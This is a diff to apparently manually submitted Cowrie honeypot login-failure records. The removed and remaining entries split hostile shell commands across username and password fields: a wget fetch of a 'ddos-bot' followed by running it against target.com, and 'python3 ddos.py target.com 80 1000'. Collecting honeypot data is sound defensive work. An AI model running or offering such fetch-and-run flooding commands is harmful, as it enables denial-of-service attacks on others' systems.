@@ -4,18 +4,6 @@
       "log": {
         "eventid": "cowrie.login.failed",
         "src_ip": "149.28.100.50",
-        "username": "\"wget",
-        "password": "github.com/ddos-bot && ./bot 1000 target.com\"",
-        "timestamp": "2026-03-29T12:04:38.181146",
-        "submitted_at": "2026-03-29T12:04:38.181175",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T12:04:38.181175"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
-        "src_ip": "149.28.100.50",
         "username": "\"python3",
         "password": "ddos.py target.com 80 1000\"ransomware",
         "timestamp": "2026-03-29T12:04:58.120098",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T22:30:20.379596"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "malware",
+        "username": "download",
+        "password": "password",
+        "timestamp": "2026-03-29T22:48:46.125596",
+        "submitted_at": "2026-03-29T22:48:46.125635",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T22:48:46.125635"
     }
   ]
 }
